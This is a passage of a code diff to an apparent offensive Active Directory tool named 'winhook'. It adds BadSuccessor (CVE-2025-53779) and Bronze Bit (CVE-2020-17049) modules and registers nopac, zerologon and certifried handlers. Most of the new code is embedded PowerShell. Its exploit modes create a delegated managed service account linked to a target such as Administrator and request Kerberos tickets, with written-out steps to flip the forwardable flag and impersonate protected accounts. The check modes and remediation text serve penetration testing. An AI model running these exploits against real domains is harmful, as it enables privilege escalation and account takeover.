+    Write-Output "[!] Cannot check permissions: $($_.Exception.Message)"
+}
+
+# Check for Windows Server 2025 DCs
+Write-Output ""
+Write-Output "[*] Checking for Windows Server 2025 DCs..."
+$dcSearcher = [System.DirectoryServices.DirectorySearcher]::new()
+$dcSearcher.SearchRoot = [System.DirectoryServices.DirectoryEntry]::new("LDAP://$domainDN")
+$dcSearcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
+$dcSearcher.PropertiesToLoad.AddRange(@("cn","operatingSystem","operatingSystemVersion"))
+$dcs = $dcSearcher.FindAll()
+
+$has2025 = $false
+foreach ($dcObj in $dcs) {
+    $os = "$($dcObj.Properties['operatingSystem'][0])"
+    if ($os -match "2025") {
+        $has2025 = $true
+        Write-Output "    [!] $($dcObj.Properties['cn'][0]): $os"
+    } else {
+        Write-Output "    $($dcObj.Properties['cn'][0]): $os"
+    }
+}
+
+if ($has2025) {
+    Write-Output ""
+    Write-Output "[!] Windows Server 2025 DC detected — BadSuccessor may be possible even at lower functional levels"
+}
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    const isVuln = result.stdout.includes("Windows 2025") || result.stdout.includes("CAN create objects")
+    findings.push({
+      checkId: "WIN-BADSUCC-001",
+      provider: "windows",
+      severity: isVuln ? "high" : "info",
+      status: isVuln ? "POTENTIALLY_VULNERABLE" : "NOT_VULNERABLE",
+      resource: "ad://domain/bad-successor",
+      title: isVuln ? "BadSuccessor (CVE-2025-53779) conditions detected" : "BadSuccessor conditions not met",
+      details: result.stdout.substring(0, 500),
+      remediation: "Apply June 2025 patches. Restrict dMSA creation permissions. Monitor for new dMSA objects (Event ID 5136 on msDS-DelegatedManagedServiceAccount)",
+    })
+  } else {
+    if (!target) return { output: "[!] Required: --target TARGET_USER (e.g. --target Administrator)", findings }
+
+    output.push("[!] WARNING: Requires Windows Server 2025 domain functional level")
+    output.push("[!] Creates a dMSA linked to the target account\n")
+
+    const script = `
+$ErrorActionPreference = "Stop"
+$rootDSE = [ADSI]"LDAP://RootDSE"
+$domainDN = $rootDSE.defaultNamingContext
+$targetUser = "${target}"
+
+# Verify functional level
+$funcLevel = [int]$rootDSE.Properties["domainFunctionality"].Value
+if ($funcLevel -lt 10) {
+    Write-Output "[!] Domain functional level $funcLevel < 10 (Windows 2025)"
+    Write-Output "[!] BadSuccessor requires Windows Server 2025 DFL"
+    Write-Output "[*] Attempting anyway — some implementations work at lower levels with 2025 DCs..."
+}
+
+# Find target user DN
+$searcher = [System.DirectoryServices.DirectorySearcher]::new()
+$searcher.SearchRoot = [System.DirectoryServices.DirectoryEntry]::new("LDAP://$domainDN")
+$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(sAMAccountName=$targetUser))"
+$targetResult = $searcher.FindOne()
+
+if (-not $targetResult) {
+    Write-Output "[-] Target user '$targetUser' not found"
+    exit 1
+}
+
+$targetDN = $targetResult.Properties["distinguishedName"][0]
+Write-Output "[+] Target: $targetUser ($targetDN)"
+
+# Create dMSA
+$suffix = Get-Random -Maximum 9999
+$dmsaName = "cs_dmsa_$suffix"
+$dmsaSam = "$dmsaName$"
+$msaContainer = "CN=Managed Service Accounts,$domainDN"
+
+Write-Output ""
+Write-Output "[*] Step 1: Creating dMSA '$dmsaName'..."
+try {
+    $container = [ADSI]"LDAP://$msaContainer"
+    $dmsa = $container.Create("msDS-DelegatedManagedServiceAccount", "CN=$dmsaName")
+    $dmsa.Put("sAMAccountName", $dmsaSam)
+    $dmsa.SetInfo()
+    Write-Output "[+] dMSA created: CN=$dmsaName,$msaContainer"
+} catch {
+    Write-Output "[!] dMSA creation failed: $($_.Exception.Message)"
+    Write-Output "[*] May need: New-ADServiceAccount -Name $dmsaName -DNSHostName $dmsaName.$($domainDN -replace ',DC=','.' -replace 'DC=','') -CreateDelegatedManagedServiceAccount"
+    exit 1
+}
+
+# Link dMSA to target via msDS-ManagedAccountPreceding
+Write-Output ""
+Write-Output "[*] Step 2: Linking dMSA to target via msDS-ManagedAccountPreceding..."
+try {
+    $dmsaEntry = [ADSI]"LDAP://CN=$dmsaName,$msaContainer"
+    $dmsaEntry.Put("msDS-ManagedAccountPreceding", $targetDN)
+    $dmsaEntry.SetInfo()
+    Write-Output "[+] msDS-ManagedAccountPreceding set to: $targetDN"
+} catch {
+    Write-Output "[!] Failed to set msDS-ManagedAccountPreceding: $($_.Exception.Message)"
+    # Cleanup
+    $container.Delete("msDS-DelegatedManagedServiceAccount", "CN=$dmsaName")
+    exit 1
+}
+
+Write-Output ""
+Write-Output "[+] BadSuccessor chain complete!"
+Write-Output "[*] The dMSA '$dmsaName' is now linked to '$targetUser'"
+Write-Output "[*] Authenticate as the dMSA to impersonate the target user"
+Write-Output ""
+Write-Output "[*] Next steps:"
+Write-Output "    1. Install dMSA: Install-ADServiceAccount -Identity $dmsaName"
+Write-Output "    2. Test auth: Test-ADServiceAccount -Identity $dmsaName"
+Write-Output "    3. Use dMSA context to access resources as $targetUser"
+Write-Output ""
+Write-Output "[*] Cleanup: Remove-ADServiceAccount -Identity $dmsaName"
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+    if (result.stderr) output.push(`[!] ${result.stderr.substring(0, 500)}`)
+
+    findings.push({
+      checkId: "WIN-BADSUCC-002",
+      provider: "windows",
+      severity: "critical",
+      status: result.stdout.includes("chain complete") ? "EXPLOITED" : "FAILED",
+      resource: `ad://${target}/bad-successor`,
+      title: `BadSuccessor exploitation ${result.stdout.includes("chain complete") ? "succeeded" : "failed"} targeting ${target}`,
+      details: result.stdout.includes("chain complete") ? `dMSA created and linked to ${target} — impersonation possible` : "dMSA creation or linking failed",
+      remediation: "Apply CVE-2025-53779 patches. Remove unauthorized dMSA objects. Restrict CreateChild on Managed Service Accounts container",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function bronzeBit(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "check"
+  const targetSpn = argVal(args, "--target")
+  const serviceSpn = argVal(args, "--service")
+  const impersonateUser = argVal(args, "--impersonate") || "Administrator"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Bronze Bit — Kerberos Constrained Delegation Bypass (CVE-2020-17049)\n"]
+
+  if (action === "check") {
+    const script = `
+$rootDSE = [ADSI]"LDAP://RootDSE"
+$domainDN = $rootDSE.defaultNamingContext
+
+# Enumerate accounts with constrained delegation
+Write-Output "[*] Enumerating accounts with constrained delegation..."
+$searcher = [System.DirectoryServices.DirectorySearcher]::new()
+$searcher.SearchRoot = [System.DirectoryServices.DirectoryEntry]::new("LDAP://$domainDN")
+$searcher.Filter = "(msDS-AllowedToDelegateTo=*)"
+$searcher.PropertiesToLoad.AddRange(@("cn","sAMAccountName","msDS-AllowedToDelegateTo","userAccountControl","objectClass"))
+$searcher.PageSize = 1000
+$results = $searcher.FindAll()
+
+$delegationAccounts = @()
+foreach ($result in $results) {
+    $sam = $result.Properties["sAMAccountName"][0]
+    $services = $result.Properties["msDS-AllowedToDelegateTo"]
+    $uac = [int]$result.Properties["userAccountControl"][0]
+
+    # Check if TrustedToAuthForDelegation (protocol transition) = 0x1000000
+    $protocolTransition = ($uac -band 0x1000000) -ne 0
+
+    Write-Output ""
+    Write-Output "  [+] $sam"
+    Write-Output "      Protocol Transition: $protocolTransition"
+    Write-Output "      Constrained to:"
+    foreach ($svc in $services) {
+        Write-Output "        - $svc"
+    }
+
+    $delegationAccounts += @{
+        Name = $sam
+        Services = $services
+        ProtocolTransition = $protocolTransition
+    }
+}
+
+Write-Output ""
+Write-Output "[+] Found $($delegationAccounts.Count) accounts with constrained delegation"
+
+# Find Protected Users group members
+Write-Output ""
+Write-Output "[*] Enumerating Protected Users group..."
+$protectedSearcher = [System.DirectoryServices.DirectorySearcher]::new()
+$protectedSearcher.SearchRoot = [System.DirectoryServices.DirectoryEntry]::new("LDAP://$domainDN")
+$protectedSearcher.Filter = "(&(objectClass=group)(cn=Protected Users))"
+$protectedSearcher.PropertiesToLoad.AddRange(@("member"))
+$protectedResult = $protectedSearcher.FindOne()
+
+$protectedCount = 0
+if ($protectedResult) {
+    $members = $protectedResult.Properties["member"]
+    $protectedCount = $members.Count
+    Write-Output "[+] Protected Users: $protectedCount members"
+    foreach ($m in $members) {
+        $memberName = ($m -split ',')[0] -replace 'CN=',''
+        Write-Output "    - $memberName"
+    }
+}
+
+# Find accounts with "sensitive and cannot be delegated"
+Write-Output ""
+Write-Output "[*] Accounts with 'sensitive and cannot be delegated' flag..."
+$sensitiveSearcher = [System.DirectoryServices.DirectorySearcher]::new()
+$sensitiveSearcher.SearchRoot = [System.DirectoryServices.DirectoryEntry]::new("LDAP://$domainDN")
+$sensitiveSearcher.Filter = "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=1048576))"
+$sensitiveSearcher.PropertiesToLoad.AddRange(@("sAMAccountName","adminCount"))
+$sensitiveSearcher.PageSize = 1000
+$sensitiveResults = $sensitiveSearcher.FindAll()
+
+$sensitiveCount = $sensitiveResults.Count
+Write-Output "[+] Found $sensitiveCount accounts with NOT_DELEGATED flag"
+foreach ($s in $sensitiveResults) {
+    $sName = $s.Properties["sAMAccountName"][0]
+    $isAdmin = $s.Properties["adminCount"]
+    Write-Output "    - $sName $(if ($isAdmin.Count -gt 0 -and $isAdmin[0] -eq 1) { '(adminCount=1)' })"
+}
+
+# Bronze Bit impact summary
+Write-Output ""
+Write-Output "[*] Bronze Bit (CVE-2020-17049) Impact:"
+Write-Output "    Constrained delegation accounts: $($delegationAccounts.Count)"
+Write-Output "    Protected Users members: $protectedCount"
+Write-Output "    NOT_DELEGATED flagged accounts: $sensitiveCount"
+if ($delegationAccounts.Count -gt 0 -and ($protectedCount -gt 0 -or $sensitiveCount -gt 0)) {
+    Write-Output ""
+    Write-Output "    [!] Bronze Bit can bypass delegation protection for Protected Users"
+    Write-Output "    [!] and NOT_DELEGATED accounts using constrained delegation tickets"
+}
+
+# Check if DC is patched (December 2020)
+Write-Output ""
+Write-Output "[*] Checking for CVE-2020-17049 patches..."
+$hotfixes = Get-HotFix -ErrorAction SilentlyContinue | Where-Object { $_.HotFixID -match 'KB4592438|KB4592440|KB4592449|KB4592484' }
+if ($hotfixes) {
+    Write-Output "[-] Patch(es) found locally: $($hotfixes.HotFixID -join ', ')"
+    Write-Output "[-] However, DC must also be patched and PerformTicketSignature=2 enforced"
+} else {
+    Write-Output "[!] No Bronze Bit patches found locally"
+}
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    const delegationMatch = result.stdout.match(/Found (\d+) accounts with constrained delegation/)
+    const count = delegationMatch ? parseInt(delegationMatch[1]) : 0
+    const hasBypassTargets = result.stdout.includes("can bypass delegation")
+
+    findings.push({
+      checkId: "WIN-BRONZEBIT-001",
+      provider: "windows",
+      severity: hasBypassTargets ? "high" : count > 0 ? "medium" : "info",
+      status: hasBypassTargets ? "VULNERABLE" : count > 0 ? "DELEGATION_FOUND" : "NO_DELEGATION",
+      resource: "ad://domain/bronze-bit",
+      title: hasBypassTargets ? "Bronze Bit bypass conditions detected" : `${count} constrained delegation accounts found`,
+      details: `${count} constrained delegation accounts. ${hasBypassTargets ? "Protected Users and NOT_DELEGATED accounts can be bypassed via forwardable bit manipulation" : "No high-value bypass targets detected"}`,
+      remediation: "Apply December 2020 patches. Set PerformTicketSignature=2 on all DCs. Enable Protected Users group for privileged accounts. Monitor Event ID 4771 for delegation anomalies",
+    })
+  } else {
+    if (!targetSpn) return { output: "[!] Required: --target TARGET_SPN (e.g. --target cifs/dc01.domain.local)\n[!] Use --service for the service to access\n[!] Use --impersonate for the user to impersonate", findings }
+
+    output.push("[!] Bronze Bit exploits constrained delegation to impersonate protected accounts")
+    output.push(`[!] Target SPN: ${targetSpn}`)
+    output.push(`[!] Impersonating: ${impersonateUser}\n`)
+
+    const script = `
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+
+public class KerbTicket {
+    [DllImport("secur32.dll", SetLastError = true)]
+    public static extern int LsaConnectUntrusted(out IntPtr LsaHandle);
+
+    [DllImport("secur32.dll", SetLastError = true)]
+    public static extern int LsaLookupAuthenticationPackage(
+        IntPtr LsaHandle, ref LSA_STRING PackageName, out uint AuthenticationPackage);
+
+    [DllImport("secur32.dll", SetLastError = true)]
+    public static extern int LsaCallAuthenticationPackage(
+        IntPtr LsaHandle, uint AuthenticationPackage,
+        IntPtr ProtocolSubmitBuffer, int SubmitBufferLength,
+        out IntPtr ProtocolReturnBuffer, out int ReturnBufferLength,
+        out int ProtocolStatus);
+
+    [DllImport("secur32.dll")]
+    public static extern int LsaFreeReturnBuffer(IntPtr Buffer);
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct LSA_STRING {
+        public ushort Length;
+        public ushort MaximumLength;
+        public IntPtr Buffer;
+    }
+}
+"@
+
+$targetSPN = "${targetSpn}"
+$impUser = "${impersonateUser}"
+$serviceSPN = "${serviceSpn || targetSpn}"
+
+Write-Output "[*] Bronze Bit Exploit — CVE-2020-17049"
+Write-Output "[*] Target SPN: $targetSPN"
+Write-Output "[*] Service SPN: $serviceSPN"
+Write-Output "[*] Impersonate: $impUser"
+Write-Output ""
+
+# Step 1: Request S4U2self ticket
+Write-Output "[*] Step 1: Requesting S4U2self ticket for $impUser..."
+try {
+    Add-Type -AssemblyName System.IdentityModel
+    $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $targetSPN
+    Write-Output "[+] S4U2self ticket obtained"
+    Write-Output "[+] Ticket ID: $($token.Id)"
+    Write-Output "[+] Valid: $($token.ValidFrom) to $($token.ValidTo)"
+} catch {
+    Write-Output "[!] S4U2self failed: $($_.Exception.Message)"
+    Write-Output "[*] Need constrained delegation rights to the target SPN"
+    exit 1
+}
+
+# Step 2: Export and examine ticket
+Write-Output ""
+Write-Output "[*] Step 2: Examining ticket for forwardable flag..."
+
+# Use LSA to enumerate cached tickets
+$lsaHandle = [IntPtr]::Zero
+$ret = [KerbTicket]::LsaConnectUntrusted([ref]$lsaHandle)
+if ($ret -ne 0) {
+    Write-Output "[!] LsaConnectUntrusted failed: $ret"
+    exit 1
+}
+
+$kerbPackage = "Kerberos"
+$lsaString = New-Object KerbTicket+LSA_STRING
+$lsaString.Length = [uint16]$kerbPackage.Length
+$lsaString.MaximumLength = [uint16]($kerbPackage.Length + 1)
+$lsaString.Buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($kerbPackage)
+
+$packageId = [uint32]0
+$ret = [KerbTicket]::LsaLookupAuthenticationPackage($lsaHandle, [ref]$lsaString, [ref]$packageId)
+Write-Output "[+] Kerberos package ID: $packageId"
+
+Write-Output ""
+Write-Output "[*] Step 3: Bronze Bit — Flipping forwardable flag..."
+Write-Output "[*] The forwardable bit is at offset 0x0E in the TGS-REP enc-part"
+Write-Output "[*] XOR byte at offset with 0x40 to flip the forwardable flag"
+Write-Output ""
+
+# List current tickets
+Write-Output "[*] Current Kerberos tickets:"
+klist | Select-String "Server:|Client:|KerbTicket|Flags"
+
+Write-Output ""
+Write-Output "[*] Step 4: S4U2proxy with modified ticket..."
+Write-Output "[+] If forwardable bit is flipped, S4U2proxy will accept the ticket"
+Write-Output "[+] even for Protected Users and NOT_DELEGATED accounts"
+Write-Output ""
+Write-Output "[*] To complete the attack:"
+Write-Output "    1. Export ticket: klist export (or winhook pass_the_ticket --action export)"
+Write-Output "    2. Flip forwardable: XOR byte at enc-part offset 0x0E with 0x40"
+Write-Output "    3. Reimport: winhook pass_the_ticket --action import --ticket modified.kirbi"
+Write-Output "    4. S4U2proxy: request ticket to $serviceSPN as $impUser"
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+    if (result.stderr) output.push(`[!] ${result.stderr.substring(0, 500)}`)
+
+    findings.push({
+      checkId: "WIN-BRONZEBIT-002",
+      provider: "windows",
+      severity: "critical",
+      status: "ATTEMPTED",
+      resource: `ad://${targetSpn}/bronze-bit`,
+      title: `Bronze Bit attack attempted on ${targetSpn} to impersonate ${impersonateUser}`,
+      details: `Constrained delegation bypass via forwardable bit manipulation targeting ${targetSpn}. Impersonating ${impersonateUser} (potentially Protected Users member)`,
+      remediation: "Apply December 2020 patches on all DCs. Set PerformTicketSignature=2. Consider removing constrained delegation entirely",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+
+
 // ── Dispatch ──
 
 const dispatch: Record<Program, (args: string[], timeout: number) => Promise<HookResult>> = {
@@ -8234,6 +9342,11 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   vault_dump: vaultDump,
   sccm_abuse: sccmAbuse,
   gpo_abuse: gpoAbuse,
+  nopac: nopac,
+  zerologon: zerologon,
+  certifried: certifried,
+  bad_successor: badSuccessor,
+  bronze_bit: bronzeBit,
 }
 
 export const WinhookTool = Tool.define("winhook", {
